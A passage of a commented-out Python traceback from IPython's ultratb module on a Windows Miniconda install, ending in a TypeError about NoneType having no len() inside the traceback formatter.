#    2036                            'the full traceback.\n']
#    2037                     stb.extend(self.InteractiveTB.get_exception_only(etype,
# -> 2038                                                                      value))
#    2039                 else:
#    2040                     try:
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in get_exception_only(self, etype, value)
#     821         value : exception value
#     822         """
# --> 823         return ListTB.structured_traceback(self, etype, value)
#     824
#     825     def show_exception_only(self, etype, evalue):
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in structured_traceback(self, etype, evalue, etb, tb_offset, context)
#     700                     chained_exceptions_tb_offset, context)
#     701                 + chained_exception_message
# --> 702                 + out_list)
#     703
#     704         return out_list
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in structured_traceback(self, etype, value, tb, tb_offset, number_of_lines_of_context)
#    1434             self.tb = tb
#    1435         return FormattedTB.structured_traceback(
# -> 1436             self, etype, value, tb, tb_offset, number_of_lines_of_context)
#    1437
#    1438
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in structured_traceback(self, etype, value, tb, tb_offset, number_of_lines_of_context)
#    1334             # Verbose modes need a full traceback
#    1335             return VerboseTB.structured_traceback(
# -> 1336                 self, etype, value, tb, tb_offset, number_of_lines_of_context
#    1337             )
#    1338         elif mode == 'Minimal':
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in structured_traceback(self, etype, evalue, etb, tb_offset, number_of_lines_of_context)
#    1191
#    1192         formatted_exception = self.format_exception_as_a_whole(etype, evalue, etb, number_of_lines_of_context,
# -> 1193                                                                tb_offset)
#    1194
#    1195         colors = self.Colors  # just a shorthand + quicker name lookup
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in format_exception_as_a_whole(self, etype, evalue, etb, number_of_lines_of_context, tb_offset)
#    1148
#    1149
# -> 1150         last_unique, recursion_repeat = find_recursion(orig_etype, evalue, records)
#    1151
#    1152         frames = self.format_records(records, last_unique, recursion_repeat)
#
# C:\ProgramData\Miniconda3\lib\site-packages\IPython\core\ultratb.py in find_recursion(etype, value, records)
#     449     # first frame (from in to out) that looks different.
#     450     if not is_recursion_error(etype, value, records):
# --> 451         return len(records), 0
#     452
#     453     # Select filename, lineno, func_name to track frames with
#
# TypeError: object of type 'NoneType' has no len()
